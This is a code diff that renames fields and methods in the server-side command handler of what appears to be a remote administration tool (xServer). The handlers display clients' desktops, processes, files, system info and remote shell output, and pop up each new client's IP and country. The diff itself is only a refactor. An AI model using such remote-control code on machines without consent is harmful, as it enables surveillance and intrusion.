@@ -11,14 +11,14 @@ namespace xServer.Core.Commands
 {
 	public static class CommandHandler
 	{
-		public static void HandleInitialize(Client client, Initialize packet, frmMain mainForm)
+		public static void HandleInitialize(Client client, Initialize packet, FrmMain mainForm)
 		{
 			if (client.EndPoint.Address.ToString() == "255.255.255.255")
 				return;
 
-			mainForm.listenServer.ConnectedClients++;
-			mainForm.listenServer.AllTimeConnectedClients++;
-			mainForm.updateWindowTitle(mainForm.listenServer.ConnectedClients, mainForm.lstClients.SelectedItems.Count);
+			mainForm.ListenServer.ConnectedClients++;
+			mainForm.ListenServer.AllTimeConnectedClients++;
+			mainForm.UpdateWindowTitle(mainForm.ListenServer.ConnectedClients, mainForm.lstClients.SelectedItems.Count);
 
 			new Thread(new ThreadStart(() =>
 			{
@@ -47,19 +47,19 @@ namespace xServer.Core.Commands
 					if (XMLSettings.ShowPopup)
 						ShowPopup(client, mainForm);
 
-					client.Value.isAuthenticated = true;
+					client.Value.IsAuthenticated = true;
 				}
 				catch
 				{ }
 			})).Start();
 		}
 
-		private static void ShowPopup(Client c, frmMain mainForm)
+		private static void ShowPopup(Client c, FrmMain mainForm)
 		{
 			mainForm.nIcon.ShowBalloonTip(30, string.Format("Client connected from {0}!", c.Value.Country), string.Format("IP Address: {0}\nOperating System: {1}", c.EndPoint.Address.ToString(), c.Value.OperatingSystem), ToolTipIcon.Info);
 		}
 
-		public static void HandleStatus(Client client, Status packet, frmMain mainForm)
+		public static void HandleStatus(Client client, Status packet, FrmMain mainForm)
 		{
 			new Thread(new ThreadStart(() =>
 			{
@@ -79,7 +79,7 @@ namespace xServer.Core.Commands
 			})).Start();
 		}
 
-		public static void HandleUserStatus(Client client, UserStatus packet, frmMain mainForm)
+		public static void HandleUserStatus(Client client, UserStatus packet, FrmMain mainForm)
 		{
 			new Thread(new ThreadStart(() =>
 			{
@@ -101,16 +101,16 @@ namespace xServer.Core.Commands
 
 		public static void HandleRemoteDesktopResponse(Client client, DesktopResponse packet)
 		{
-			if (client.Value.frmRDP == null)
+			if (client.Value.FrmRdp == null)
 				return;
 
-			if (client.Value.lastDesktop == null)
+			if (client.Value.LastDesktop == null)
 			{
 				Bitmap newScreen = (Bitmap)Helper.Helper.CByteToImg(packet.Image);
-				client.Value.lastDesktop = newScreen;
-				client.Value.frmRDP.Invoke((MethodInvoker)delegate
+				client.Value.LastDesktop = newScreen;
+				client.Value.FrmRdp.Invoke((MethodInvoker)delegate
 				{
-					client.Value.frmRDP.picDesktop.Image = newScreen;
+					client.Value.FrmRdp.picDesktop.Image = newScreen;
 				});
 				newScreen = null;
 			}
@@ -122,31 +122,31 @@ namespace xServer.Core.Commands
 
 				using (Graphics g = Graphics.FromImage(newScreen))
 				{
-					g.DrawImage(client.Value.lastDesktop, 0, 0, newScreen.Width, newScreen.Height);
+					g.DrawImage(client.Value.LastDesktop, 0, 0, newScreen.Width, newScreen.Height);
 					g.DrawImage(screen, 0, 0, newScreen.Width, newScreen.Height);
 				}
 
-				client.Value.lastDesktop = newScreen;
-				client.Value.frmRDP.Invoke((MethodInvoker)delegate
+				client.Value.LastDesktop = newScreen;
+				client.Value.FrmRdp.Invoke((MethodInvoker)delegate
 				{
-					client.Value.frmRDP.picDesktop.Image = newScreen;
+					client.Value.FrmRdp.picDesktop.Image = newScreen;
 				});
 				screen = null;
 				newScreen = null;
 			}
 
 			packet.Image = null;
-			client.Value.lastDesktopSeen = true;
+			client.Value.LastDesktopSeen = true;
 		}
 
 		public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
 		{
-			if (client.Value.frmTM == null)
+			if (client.Value.FrmTm == null)
 				return;
 
-			client.Value.frmTM.Invoke((MethodInvoker)delegate
+			client.Value.FrmTm.Invoke((MethodInvoker)delegate
 			{
-				client.Value.frmTM.lstTasks.Items.Clear();
+				client.Value.FrmTm.lstTasks.Items.Clear();
 			});
 
 			new Thread(new ThreadStart(() =>
@@ -158,9 +158,9 @@ namespace xServer.Core.Commands
 						ListViewItem lvi = new ListViewItem(new string[] { packet.Processes[i], packet.IDs[i].ToString(), packet.Titles[i] });
 						try
 						{
-							client.Value.frmTM.Invoke((MethodInvoker)delegate
+							client.Value.FrmTm.Invoke((MethodInvoker)delegate
 							{
-								client.Value.frmTM.lstTasks.Items.Add(lvi);
+								client.Value.FrmTm.lstTasks.Items.Add(lvi);
 							});
 						}
 						catch
@@ -172,25 +172,25 @@ namespace xServer.Core.Commands
 
 		public static void HandleDrivesResponse(Client client, DrivesResponse packet)
 		{
-			if (client.Value.frmFM == null)
+			if (client.Value.FrmFm == null)
 				return;
 
-			client.Value.frmFM.Invoke((MethodInvoker)delegate
+			client.Value.FrmFm.Invoke((MethodInvoker)delegate
 			{
-				client.Value.frmFM.cmbDrives.Items.Clear();
-				client.Value.frmFM.cmbDrives.Items.AddRange(packet.Drives);
-				client.Value.frmFM.cmbDrives.SelectedIndex = 0;
+				client.Value.FrmFm.cmbDrives.Items.Clear();
+				client.Value.FrmFm.cmbDrives.Items.AddRange(packet.Drives);
+				client.Value.FrmFm.cmbDrives.SelectedIndex = 0;
 			});
 		}
 
 		public static void HandleDirectoryResponse(Client client, DirectoryResponse packet)
 		{
-			if (client.Value.frmFM == null)
+			if (client.Value.FrmFm == null)
 				return;
 
-			client.Value.frmFM.Invoke((MethodInvoker)delegate
+			client.Value.FrmFm.Invoke((MethodInvoker)delegate
 			{
-				client.Value.frmFM.lstDirectory.Items.Clear();
+				client.Value.FrmFm.lstDirectory.Items.Clear();
 			});
 
 			new Thread(new ThreadStart(() =>
@@ -198,9 +198,9 @@ namespace xServer.Core.Commands
 				ListViewItem lviBack = new ListViewItem(new string[] { "..", "", "Directory" });
 				lviBack.Tag = "dir";
 				lviBack.ImageIndex = 0;
-				client.Value.frmFM.Invoke((MethodInvoker)delegate
+				client.Value.FrmFm.Invoke((MethodInvoker)delegate
 				{
-					client.Value.frmFM.lstDirectory.Items.Add(lviBack);
+					client.Value.FrmFm.lstDirectory.Items.Add(lviBack);
 				});
 
 				if (packet.Folders.Length != 0)
@@ -216,9 +216,9 @@ namespace xServer.Core.Commands
 
 							try
 							{
-								client.Value.frmFM.Invoke((MethodInvoker)delegate
+								client.Value.FrmFm.Invoke((MethodInvoker)delegate
 								{
-									client.Value.frmFM.lstDirectory.Items.Add(lvi);
+									client.Value.FrmFm.lstDirectory.Items.Add(lvi);
 								});
 							}
 							catch
@@ -240,9 +240,9 @@ namespace xServer.Core.Commands
 
 							try
 							{
-								client.Value.frmFM.Invoke((MethodInvoker)delegate
+								client.Value.FrmFm.Invoke((MethodInvoker)delegate
 								{
-									client.Value.frmFM.lstDirectory.Items.Add(lvi);
+									client.Value.FrmFm.lstDirectory.Items.Add(lvi);
 								});
 							}
 							catch
@@ -251,7 +251,7 @@ namespace xServer.Core.Commands
 					}
 				}
 
-				client.Value.lastDirectorySeen = true;
+				client.Value.LastDirectorySeen = true;
 			})).Start();
 		}
 
@@ -271,9 +271,9 @@ namespace xServer.Core.Commands
 			int index = 0;
 			try
 			{
-				client.Value.frmFM.Invoke((MethodInvoker)delegate
+				client.Value.FrmFm.Invoke((MethodInvoker)delegate
 				{
-					foreach (ListViewItem lvi in client.Value.frmFM.lstTransfers.Items)
+					foreach (ListViewItem lvi in client.Value.FrmFm.lstTransfers.Items)
 					{
 						if (packet.ID.ToString() == lvi.SubItems[0].Text)
 						{
@@ -292,19 +292,19 @@ namespace xServer.Core.Commands
 				{
 					try
 					{
-						client.Value.frmFM.Invoke((MethodInvoker)delegate
+						client.Value.FrmFm.Invoke((MethodInvoker)delegate
 						{
-							client.Value.frmFM.lstTransfers.Items[index].SubItems[1].Text = "Saving...";
+							client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Saving...";
 						});
 
 						using (FileStream stream = new FileStream(downloadPath, FileMode.Create))
 						{
 							stream.Write(packet.FileByte, 0, packet.FileByte.Length);
 						}
-						client.Value.frmFM.Invoke((MethodInvoker)delegate
+						client.Value.FrmFm.Invoke((MethodInvoker)delegate
 						{
-							client.Value.frmFM.lstTransfers.Items[index].SubItems[1].Text = "Completed";
-							client.Value.frmFM.lstTransfers.Items[index].ImageIndex = 1;
+							client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Completed";
+							client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 1;
 						});
 					}
 					catch
@@ -315,10 +315,10 @@ namespace xServer.Core.Commands
 			{
 				try
 				{
-					client.Value.frmFM.Invoke((MethodInvoker)delegate
+					client.Value.FrmFm.Invoke((MethodInvoker)delegate
 					{
-						client.Value.frmFM.lstTransfers.Items[index].SubItems[1].Text = "Canceled";
-						client.Value.frmFM.lstTransfers.Items[index].ImageIndex = 0;
+						client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Canceled";
+						client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
 					});
 				}
 				catch
@@ -328,7 +328,7 @@ namespace xServer.Core.Commands
 
 		public static void HandleGetSystemInfoResponse(Client client, GetSystemInfoResponse packet)
 		{
-			if (client.Value.frmSI == null)
+			if (client.Value.FrmSi == null)
 				return;
 
 			ListViewItem[] lviCollection = new ListViewItem[packet.SystemInfos.Length / 2];
@@ -342,22 +342,22 @@ namespace xServer.Core.Commands
 				}
 			}
 
-			if (client.Value.frmSI == null)
+			if (client.Value.FrmSi == null)
 				return;
 
 			try
 			{
-				client.Value.frmSI.Invoke((MethodInvoker)delegate
+				client.Value.FrmSi.Invoke((MethodInvoker)delegate
 				{
-					client.Value.frmSI.lstSystem.Items.RemoveAt(2); // Loading... Information
+					client.Value.FrmSi.lstSystem.Items.RemoveAt(2); // Loading... Information
 					foreach(var lviItem in lviCollection)
 					{
 						if (lviItem != null)
-							client.Value.frmSI.lstSystem.Items.Add(lviItem);
+							client.Value.FrmSi.lstSystem.Items.Add(lviItem);
 					}
 				});
 
-				ListViewExtensions.autosizeColumns(client.Value.frmSI.lstSystem);
+				ListViewExtensions.autosizeColumns(client.Value.FrmSi.lstSystem);
 			}
 			catch
 			{ }
@@ -365,16 +365,16 @@ namespace xServer.Core.Commands
 
 		public static void HandleMonitorsResponse(Client client, MonitorsResponse packet)
 		{
-			if (client.Value.frmRDP == null)
+			if (client.Value.FrmRdp == null)
 				return;
 
 			try
 			{
-				client.Value.frmRDP.Invoke((MethodInvoker)delegate
+				client.Value.FrmRdp.Invoke((MethodInvoker)delegate
 				{
 					for (int i = 0; i < packet.Number; i++)
-						client.Value.frmRDP.cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
-					client.Value.frmRDP.cbMonitors.SelectedIndex = 0;
+						client.Value.FrmRdp.cbMonitors.Items.Add(string.Format("Monitor {0}", i + 1));
+					client.Value.FrmRdp.cbMonitors.SelectedIndex = 0;
 				});
 			}
 			catch
@@ -383,14 +383,14 @@ namespace xServer.Core.Commands
 
 		public static void HandleShellCommandResponse(Client client, ShellCommandResponse packet)
 		{
-			if (client.Value.frmRS == null)
+			if (client.Value.FrmRs == null)
 				return;
 
 			try
 			{
-				client.Value.frmRS.Invoke((MethodInvoker)delegate
+				client.Value.FrmRs.Invoke((MethodInvoker)delegate
 				{
-					client.Value.frmRS.txtConsoleOutput.Text += packet.Output;
+					client.Value.FrmRs.txtConsoleOutput.Text += packet.Output;
 				});
 			}
 			catch
